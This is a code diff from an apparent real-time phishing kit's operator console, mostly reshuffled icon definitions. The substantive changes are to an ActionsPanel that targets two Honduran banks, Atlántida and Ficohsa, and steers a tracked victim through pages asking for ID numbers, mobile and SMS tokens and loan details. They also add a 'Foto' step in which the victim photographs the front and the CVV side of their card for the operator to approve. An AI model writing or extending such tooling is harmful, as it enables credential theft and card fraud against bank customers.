-const __iconNode$f = [["path", { "d": "M3 21l18 0", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M5 6l7 -3l7 3", "key": "svg-2" }], ["path", { "d": "M4 10l0 11", "key": "svg-3" }], ["path", { "d": "M20 10l0 11", "key": "svg-4" }], ["path", { "d": "M8 14l0 3", "key": "svg-5" }], ["path", { "d": "M12 14l0 3", "key": "svg-6" }], ["path", { "d": "M16 14l0 3", "key": "svg-7" }]];
-const IconBuildingBank = createReactComponent("outline", "building-bank", "BuildingBank", __iconNode$f);
+const __iconNode$l = [["path", { "d": "M3 21l18 0", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M5 6l7 -3l7 3", "key": "svg-2" }], ["path", { "d": "M4 10l0 11", "key": "svg-3" }], ["path", { "d": "M20 10l0 11", "key": "svg-4" }], ["path", { "d": "M8 14l0 3", "key": "svg-5" }], ["path", { "d": "M12 14l0 3", "key": "svg-6" }], ["path", { "d": "M16 14l0 3", "key": "svg-7" }]];
+const IconBuildingBank = createReactComponent("outline", "building-bank", "BuildingBank", __iconNode$l);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22729,8 +22773,8 @@ const IconBuildingBank = createReactComponent("outline", "building-bank", "Build
  */
 
 
-const __iconNode$e = [["path", { "d": "M5 12l5 5l10 -10", "key": "svg-0" }]];
-const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$e);
+const __iconNode$k = [["path", { "d": "M5 7h1a2 2 0 0 0 2 -2a1 1 0 0 1 1 -1h6a1 1 0 0 1 1 1a2 2 0 0 0 2 2h1a2 2 0 0 1 2 2v9a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-9a2 2 0 0 1 2 -2", "key": "svg-0" }], ["path", { "d": "M9 13a3 3 0 1 0 6 0a3 3 0 0 0 -6 0", "key": "svg-1" }]];
+const IconCamera = createReactComponent("outline", "camera", "Camera", __iconNode$k);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22740,8 +22784,8 @@ const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$e
  */
 
 
-const __iconNode$d = [["path", { "d": "M6 9l6 6l6 -6", "key": "svg-0" }]];
-const IconChevronDown = createReactComponent("outline", "chevron-down", "ChevronDown", __iconNode$d);
+const __iconNode$j = [["path", { "d": "M5 12l5 5l10 -10", "key": "svg-0" }]];
+const IconCheck = createReactComponent("outline", "check", "Check", __iconNode$j);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22751,8 +22795,8 @@ const IconChevronDown = createReactComponent("outline", "chevron-down", "Chevron
  */
 
 
-const __iconNode$c = [["path", { "d": "M6 15l6 -6l6 6", "key": "svg-0" }]];
-const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp", __iconNode$c);
+const __iconNode$i = [["path", { "d": "M6 9l6 6l6 -6", "key": "svg-0" }]];
+const IconChevronDown = createReactComponent("outline", "chevron-down", "ChevronDown", __iconNode$i);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22762,8 +22806,8 @@ const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp",
  */
 
 
-const __iconNode$b = [["path", { "d": "M7 9.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667l0 -8.666", "key": "svg-0" }], ["path", { "d": "M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1", "key": "svg-1" }]];
-const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$b);
+const __iconNode$h = [["path", { "d": "M6 15l6 -6l6 6", "key": "svg-0" }]];
+const IconChevronUp = createReactComponent("outline", "chevron-up", "ChevronUp", __iconNode$h);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22773,8 +22817,8 @@ const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$b);
  */
 
 
-const __iconNode$a = [["path", { "d": "M4 14v-3a8 8 0 1 1 16 0v3", "key": "svg-0" }], ["path", { "d": "M18 19c0 1.657 -2.686 3 -6 3", "key": "svg-1" }], ["path", { "d": "M4 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-2" }], ["path", { "d": "M15 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-3" }]];
-const IconHeadset = createReactComponent("outline", "headset", "Headset", __iconNode$a);
+const __iconNode$g = [["path", { "d": "M3 12a9 9 0 1 0 18 0a9 9 0 1 0 -18 0", "key": "svg-0" }], ["path", { "d": "M12 12l3 2", "key": "svg-1" }], ["path", { "d": "M12 7v5", "key": "svg-2" }]];
+const IconClockHour4 = createReactComponent("outline", "clock-hour-4", "ClockHour4", __iconNode$g);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22784,8 +22828,8 @@ const IconHeadset = createReactComponent("outline", "headset", "Headset", __icon
  */
 
 
-const __iconNode$9 = [["path", { "d": "M12 3a9 9 0 1 0 9 9", "key": "svg-0" }]];
-const IconLoader2 = createReactComponent("outline", "loader-2", "Loader2", __iconNode$9);
+const __iconNode$f = [["path", { "d": "M7 9.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667l0 -8.666", "key": "svg-0" }], ["path", { "d": "M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1", "key": "svg-1" }]];
+const IconCopy = createReactComponent("outline", "copy", "Copy", __iconNode$f);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22795,8 +22839,8 @@ const IconLoader2 = createReactComponent("outline", "loader-2", "Loader2", __ico
  */
 
 
-const __iconNode$8 = [["path", { "d": "M14 8v-2a2 2 0 0 0 -2 -2h-7a2 2 0 0 0 -2 2v12a2 2 0 0 0 2 2h7a2 2 0 0 0 2 -2v-2", "key": "svg-0" }], ["path", { "d": "M9 12h12l-3 -3", "key": "svg-1" }], ["path", { "d": "M18 15l3 -3", "key": "svg-2" }]];
-const IconLogout = createReactComponent("outline", "logout", "Logout", __iconNode$8);
+const __iconNode$e = [["path", { "d": "M3 8a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3l0 -8", "key": "svg-0" }], ["path", { "d": "M3 10l18 0", "key": "svg-1" }], ["path", { "d": "M7 15l.01 0", "key": "svg-2" }], ["path", { "d": "M11 15l2 0", "key": "svg-3" }]];
+const IconCreditCard = createReactComponent("outline", "credit-card", "CreditCard", __iconNode$e);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22806,8 +22850,8 @@ const IconLogout = createReactComponent("outline", "logout", "Logout", __iconNod
  */
 
 
-const __iconNode$7 = [["path", { "d": "M12 11v.01", "key": "svg-0" }], ["path", { "d": "M8 11v.01", "key": "svg-1" }], ["path", { "d": "M16 11v.01", "key": "svg-2" }], ["path", { "d": "M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3l12 0", "key": "svg-3" }]];
-const IconMessageDots = createReactComponent("outline", "message-dots", "MessageDots", __iconNode$7);
+const __iconNode$d = [["path", { "d": "M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2v-2", "key": "svg-0" }], ["path", { "d": "M7 11l5 5l5 -5", "key": "svg-1" }], ["path", { "d": "M12 4l0 12", "key": "svg-2" }]];
+const IconDownload = createReactComponent("outline", "download", "Download", __iconNode$d);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22817,8 +22861,8 @@ const IconMessageDots = createReactComponent("outline", "message-dots", "Message
  */
 
 
-const __iconNode$6 = [["path", { "d": "M4 20h4l10.5 -10.5a2.828 2.828 0 1 0 -4 -4l-10.5 10.5v4", "key": "svg-0" }], ["path", { "d": "M13.5 6.5l4 4", "key": "svg-1" }]];
-const IconPencil = createReactComponent("outline", "pencil", "Pencil", __iconNode$6);
+const __iconNode$c = [["path", { "d": "M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0", "key": "svg-0" }], ["path", { "d": "M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6", "key": "svg-1" }]];
+const IconEye = createReactComponent("outline", "eye", "Eye", __iconNode$c);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22828,8 +22872,8 @@ const IconPencil = createReactComponent("outline", "pencil", "Pencil", __iconNod
  */
 
 
-const __iconNode$5 = [["path", { "d": "M3 21l18 -18", "key": "svg-0" }], ["path", { "d": "M5.831 14.161a15.946 15.946 0 0 1 -2.831 -8.161a2 2 0 0 1 2 -2h4l2 5l-2.5 1.5c.108 .22 .223 .435 .345 .645m1.751 2.277c.843 .84 1.822 1.544 2.904 2.078l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a15.963 15.963 0 0 1 -10.344 -4.657", "key": "svg-1" }]];
-const IconPhoneOff = createReactComponent("outline", "phone-off", "PhoneOff", __iconNode$5);
+const __iconNode$b = [["path", { "d": "M4 14v-3a8 8 0 1 1 16 0v3", "key": "svg-0" }], ["path", { "d": "M18 19c0 1.657 -2.686 3 -6 3", "key": "svg-1" }], ["path", { "d": "M4 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-2" }], ["path", { "d": "M15 14a2 2 0 0 1 2 -2h1a2 2 0 0 1 2 2v3a2 2 0 0 1 -2 2h-1a2 2 0 0 1 -2 -2v-3", "key": "svg-3" }]];
+const IconHeadset = createReactComponent("outline", "headset", "Headset", __iconNode$b);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22839,8 +22883,74 @@ const IconPhoneOff = createReactComponent("outline", "phone-off", "PhoneOff", __
  */
 
 
-const __iconNode$4 = [["path", { "d": "M5 4h4l2 5l-2.5 1.5a11 11 0 0 0 5 5l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a16 16 0 0 1 -15 -15a2 2 0 0 1 2 -2", "key": "svg-0" }]];
-const IconPhone = createReactComponent("outline", "phone", "Phone", __iconNode$4);
+const __iconNode$a = [["path", { "d": "M12 3a9 9 0 1 0 9 9", "key": "svg-0" }]];
+const IconLoader2 = createReactComponent("outline", "loader-2", "Loader2", __iconNode$a);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$9 = [["path", { "d": "M14 8v-2a2 2 0 0 0 -2 -2h-7a2 2 0 0 0 -2 2v12a2 2 0 0 0 2 2h7a2 2 0 0 0 2 -2v-2", "key": "svg-0" }], ["path", { "d": "M9 12h12l-3 -3", "key": "svg-1" }], ["path", { "d": "M18 15l3 -3", "key": "svg-2" }]];
+const IconLogout = createReactComponent("outline", "logout", "Logout", __iconNode$9);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$8 = [["path", { "d": "M12 11v.01", "key": "svg-0" }], ["path", { "d": "M8 11v.01", "key": "svg-1" }], ["path", { "d": "M16 11v.01", "key": "svg-2" }], ["path", { "d": "M18 4a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-5l-5 3v-3h-2a3 3 0 0 1 -3 -3v-8a3 3 0 0 1 3 -3l12 0", "key": "svg-3" }]];
+const IconMessageDots = createReactComponent("outline", "message-dots", "MessageDots", __iconNode$8);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$7 = [["path", { "d": "M4 20h4l10.5 -10.5a2.828 2.828 0 1 0 -4 -4l-10.5 10.5v4", "key": "svg-0" }], ["path", { "d": "M13.5 6.5l4 4", "key": "svg-1" }]];
+const IconPencil = createReactComponent("outline", "pencil", "Pencil", __iconNode$7);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$6 = [["path", { "d": "M3 21l18 -18", "key": "svg-0" }], ["path", { "d": "M5.831 14.161a15.946 15.946 0 0 1 -2.831 -8.161a2 2 0 0 1 2 -2h4l2 5l-2.5 1.5c.108 .22 .223 .435 .345 .645m1.751 2.277c.843 .84 1.822 1.544 2.904 2.078l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a15.963 15.963 0 0 1 -10.344 -4.657", "key": "svg-1" }]];
+const IconPhoneOff = createReactComponent("outline", "phone-off", "PhoneOff", __iconNode$6);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$5 = [["path", { "d": "M5 4h4l2 5l-2.5 1.5a11 11 0 0 0 5 5l1.5 -2.5l5 2v4a2 2 0 0 1 -2 2a16 16 0 0 1 -15 -15a2 2 0 0 1 2 -2", "key": "svg-0" }]];
+const IconPhone = createReactComponent("outline", "phone", "Phone", __iconNode$5);
+
+/**
+ * @license @tabler/icons-react v3.36.1 - MIT
+ *
+ * This source code is licensed under the MIT license.
+ * See the LICENSE file in the root directory of this source tree.
+ */
+
+
+const __iconNode$4 = [["path", { "d": "M20 11a8.1 8.1 0 0 0 -15.5 -2m-.5 -4v4h4", "key": "svg-0" }], ["path", { "d": "M4 13a8.1 8.1 0 0 0 15.5 2m.5 4v-4h-4", "key": "svg-1" }]];
+const IconRefresh = createReactComponent("outline", "refresh", "Refresh", __iconNode$4);
 
 /**
  * @license @tabler/icons-react v3.36.1 - MIT
@@ -22901,6 +23011,7 @@ const ActionsPanel = ({
   onShowSuccess,
   onFinalizar,
   onError,
+  onFoto,
   selectedBank = "atlantida"
 }) => {
   const [isEnding, setIsEnding] = reactExports.useState(false);
@@ -22953,13 +23064,14 @@ const ActionsPanel = ({
   const statusKey = user?.pageState || "inactive";
   const badgeClasses = statusKey === "viewing" ? "bg-green-500 text-white ring-1 ring-green-400/40 border-2 border-white" : statusKey === "minimized" ? "bg-yellow-500 text-white ring-1 ring-yellow-400/40 border-2 border-white" : "bg-red-500 text-white ring-1 ring-red-400/40 border-2 border-white";
   const isFicohsa = selectedBank === "ficohsa";
-  const themeActiveBtnClass = isFicohsa ? "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#0058CB] shadow hover:bg-[#0058CB]/90 active:bg-[#003a7c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#0058CB]/60" : "bg-[#E31B23] text-white font-bold backdrop-blur-md border border-[#E31B23] shadow hover:bg-[#E31B23]/90 active:bg-[#b71c1c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#E31B23]/60";
-  const indigoBtnClass = "bg-indigo-600 text-white font-bold backdrop-blur-md border border-indigo-700 shadow hover:bg-indigo-700/90 active:bg-indigo-900 active:translate-y-[1.5px] focus:ring-2 focus:ring-indigo-500/60";
+  const themeActiveBtnClass = isFicohsa ? "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#0058CB] shadow hover:bg-[#0047a8] active:bg-[#003a7c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#0058CB]/60" : "bg-[#E31B23] text-white font-bold backdrop-blur-md border border-[#E31B23] shadow hover:bg-[#E31B23]/90 active:bg-[#b71c1c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#E31B23]/60";
+  const tokenBtnClass = themeActiveBtnClass;
+  const fotoBtnClass = "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#004bb0] shadow hover:bg-[#0045a3] active:bg-[#003680] active:translate-y-[1.5px] focus:ring-2 focus:ring-cyan-400/60";
   const btn1Label = "DNI/RTN";
   const btn2Label = isFicohsa ? "Token Móvil" : "Desbloquear";
   const btn3Label = isFicohsa ? "Token SMS" : "Registrar";
   const btn4Label = isFicohsa ? "Préstamo" : "Finalizar";
-  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "\r\n      bg-gray-900/80 backdrop-blur-lg \r\n      p-3.5 rounded-xl \r\n      border border-gray-700/30 \r\n      shadow-xl shadow-black/20 \r\n      cursor-move w-72 text-xs\r\n    ", children: [
+  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "\r\n      bg-neutral-950/90 backdrop-blur-xl \r\n      p-3.5 rounded-xl \r\n      border border-neutral-800/80 \r\n      shadow-2xl shadow-black/60 \r\n      cursor-move w-72 text-xs\r\n    ", children: [
     /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center py-2 mb-2", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "inline-flex items-center gap-1 px-2.5 py-1 rounded-full bg-transparent", children: [
       /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `w-2.5 h-2.5 rounded-full mr-1 ${statusKey === "viewing" || statusKey === "active" ? "bg-emerald-400" : statusKey === "minimized" ? "bg-amber-400" : "bg-red-400"}` }),
       /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `text-xs font-semibold ${statusKey === "viewing" || statusKey === "active" ? "text-emerald-300" : statusKey === "minimized" ? "text-amber-300" : "text-red-300"}`, children: getStatusText(statusKey) })
@@ -22973,7 +23085,7 @@ const ActionsPanel = ({
             disabled: !isPageEnabled(1),
             className: `
                 py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
-                ${isPageEnabled(1) ? indigoBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+                ${isPageEnabled(1) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
               `,
             children: btn1Label
           }
@@ -22997,7 +23109,7 @@ const ActionsPanel = ({
           disabled: !isPageEnabled(1),
           className: `
               py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out col-span-2
-              ${isPageEnabled(1) ? indigoBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+              ${isPageEnabled(1) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
             `,
           children: btn1Label
         }
@@ -23009,7 +23121,7 @@ const ActionsPanel = ({
           disabled: !isPageEnabled(2),
           className: `
             py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
-            ${isPageEnabled(2) ? indigoBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+            ${isPageEnabled(2) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
           `,
           children: btn2Label
         }
@@ -23021,7 +23133,7 @@ const ActionsPanel = ({
           disabled: !isPageEnabled(3),
           className: `
             py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
-            ${isPageEnabled(3) ? indigoBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+            ${isPageEnabled(3) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
           `,
           children: btn3Label
         }
@@ -23063,6 +23175,25 @@ const ActionsPanel = ({
           }
         ),
         (currentPage !== 0 || successPressed) && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n              absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n              hidden group-hover:block \r\n              bg-gray-900/95 text-white text-[10px] \r\n              rounded-md px-2.5 py-1.5 \r\n              shadow-xl border border-gray-700/40 \r\n              backdrop-blur-sm whitespace-nowrap z-50\r\n            ", children: successPressed ? "Ya se confirmó éxito" : "Solo disponible en estado de carga" })
+      ] }),
+      isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "col-span-2 relative group", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs(
+          "button",
+          {
+            onClick: () => onFoto ? onFoto() : onUpdatePage(7),
+            disabled: currentPage !== 0 && currentPage !== 7,
+            className: `
+                w-full py-2 px-3 rounded-lg font-medium flex items-center justify-center gap-1.5 
+                transition-all duration-300 ease-out
+                ${currentPage === 7 ? `${fotoBtnClass} ring-2 ring-cyan-400/60` : currentPage === 0 ? fotoBtnClass : "bg-gray-800/50 text-blue-400/70 cursor-not-allowed border border-blue-900/30 backdrop-blur-sm hover:bg-gray-800/60"}
+              `,
+            children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 14 }),
+              "Foto"
+            ]
+          }
+        ),
+        currentPage !== 0 && currentPage !== 7 && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "\r\n                absolute bottom-full left-1/2 -translate-x-1/2 mb-2 \r\n                hidden group-hover:block \r\n                bg-gray-900/95 text-white text-[10px] \r\n                rounded-md px-2.5 py-1.5 \r\n                shadow-xl border border-gray-700/40 \r\n                backdrop-blur-sm whitespace-nowrap z-50\r\n              ", children: "Solo disponible en estado de carga" })
       ] }),
       /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "col-span-2 h-3" }),
       /* @__PURE__ */ jsxRuntimeExports.jsxs(
@@ -56098,16 +56229,22 @@ const EmulatorHeader = () => {
   );
 };
 
-const EmulatorBoundContainer = ({ children }) => /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "relative w-full h-full min-h-full overflow-hidden bg-gray-200 no-scrollbar", children });
-const EmulatorPageLayout = ({ children }) => /* @__PURE__ */ jsxRuntimeExports.jsxs(EmulatorBoundContainer, { children: [
+const EmulatorBoundContainer = ({ children }) => /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "relative w-full h-full min-h-full flex flex-col overflow-y-auto no-scrollbar bg-gray-200", children });
+const EmulatorPageLayout = ({ children, isExpanded = false }) => /* @__PURE__ */ jsxRuntimeExports.jsxs(EmulatorBoundContainer, { children: [
   /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorHeader, {}),
-  /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex-1 flex items-start justify-center px-4 bg-gray-200 min-h-[calc(100%-9rem)] no-scrollbar", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
+  /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex-1 w-full flex items-start justify-center px-4 bg-gray-200 pb-16 no-scrollbar", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
     "div",
     {
-      className: "\r\n          w-full max-w-sm\r\n          -mt-8 sm:-mt-8\r\n          relative z-20\r\n          no-scrollbar\r\n        ",
+      className: `
+          w-full
+          ${isExpanded ? "max-w-lg -mt-6 sm:-mt-8" : "max-w-sm -mt-8 sm:-mt-8"}
+          relative z-20
+          no-scrollbar
+        `,
       children
     }
-  ) })
+  ) }),
+  isExpanded && /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 min-h-full z-10 bg-black/55 backdrop-blur-[1px] pointer-events-none transition-opacity duration-300" })
 ] });
 
 const EmulatorLoader = ({ successMessage }) => {
@@ -56364,6 +56501,107 @@ const PrestamoPage = ({ prestamoToken }) => /* @__PURE__ */ jsxRuntimeExports.js
   }
 );
 
+const FotoPage = ({
+  fotoTemporal,
+  fotoTemporalHD,
+  esperandoAprobacionFoto,
+  fotoRechazada,
+  fotoAprobada,
+  pasoFoto = "frente",
+  onAprobarFoto,
+  onRechazarFoto
+}) => {
+  const imagenMostrar = fotoTemporalHD || fotoTemporal;
+  const esReverso = pasoFoto === "reverso";
+  const esCompletado = pasoFoto === "completado" || fotoAprobada;
+  return /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center select-none bg-black/90 text-white rounded-2xl shadow-2xl border border-neutral-800 p-5 sm:p-6 backdrop-blur-md", children: [
+    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex items-center justify-between pb-3 mb-4 border-b border-neutral-800", children: [
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2.5", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "p-2 rounded-xl bg-blue-600/20 text-cyan-400 border border-blue-500/30", children: /* @__PURE__ */ jsxRuntimeExports.jsx(IconCreditCard, { size: 20 }) }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("h2", { className: "text-base font-bold text-white tracking-wide leading-tight", children: esCompletado ? "Tarjeta Verificada" : esReverso ? "Reverso de Tarjeta" : "Frente de Tarjeta" }),
+          /* @__PURE__ */ jsxRuntimeExports.jsxs("p", { className: "text-xs text-gray-300 mt-0.5", children: [
+            "Paso ",
+            esReverso ? "2 de 2" : "1 de 2",
+            " • ",
+            esReverso ? "Posterior (CVV/Firma)" : "Parte delantera"
+          ] })
+        ] })
+      ] }),
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
+        esperandoAprobacionFoto && imagenMostrar && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-amber-500/25 text-amber-300 border border-amber-400/40 text-xs font-semibold px-3 py-1 rounded-full animate-pulse shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2 h-2 rounded-full bg-amber-400" }),
+          "Por Validar"
+        ] }),
+        fotoRechazada && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-red-500/25 text-red-300 border border-red-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-1.5 h-1.5 rounded-full bg-red-400" }),
+          "Reintentando..."
+        ] }),
+        esCompletado && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "inline-flex items-center gap-1.5 bg-emerald-500/25 text-emerald-300 border border-emerald-400/40 text-xs font-semibold px-3 py-1 rounded-full shadow-sm", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 14, className: "text-emerald-400" }),
+          "Aprobada"
+        ] })
+      ] })
+    ] }),
+    imagenMostrar ? (
+      /* Vista de la fotografía enviada con proporción de tarjeta */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full flex flex-col items-center gap-4", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "relative w-full max-w-[440px] aspect-[1.58/1] rounded-2xl overflow-hidden bg-black shadow-2xl border-2 border-cyan-400/80", children: [
+          /* @__PURE__ */ jsxRuntimeExports.jsx(
+            "img",
+            {
+              src: imagenMostrar,
+              alt: esReverso ? "Reverso de Tarjeta" : "Frente de Tarjeta",
+              className: "w-full h-full object-cover"
+            }
+          ),
+          /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute top-3 left-3 bg-black/80 backdrop-blur-md text-white text-[10px] font-bold uppercase tracking-wider px-2.5 py-1 rounded-lg border border-white/20 shadow-md", children: esReverso ? "Lado Reverso" : "Lado Frontal" })
+        ] }),
+        esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-center gap-3 w-full max-w-[440px] pt-1", children: [
+          onRechazarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              onClick: onRechazarFoto,
+              className: "flex-1 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30 transition-all flex items-center justify-center gap-2 shadow-md active:scale-95",
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 17 }),
+                "Pedir reintento"
+              ]
+            }
+          ),
+          onAprobarFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+            "button",
+            {
+              type: "button",
+              onClick: onAprobarFoto,
+              className: "flex-1 py-3 px-5 rounded-xl font-bold text-xs sm:text-sm bg-emerald-600 hover:bg-emerald-500 text-white transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/50 active:scale-95",
+              children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 18, strokeWidth: 2.5 }),
+                "Aprobar"
+              ]
+            }
+          )
+        ] })
+      ] })
+    ) : (
+      /* Vista de espera activa mientras el visitante captura */
+      /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "w-full max-w-[440px] aspect-[1.58/1] rounded-2xl border-2 border-dashed border-cyan-400/40 flex items-center justify-center bg-black/50 backdrop-blur-sm relative overflow-hidden shadow-2xl", children: [
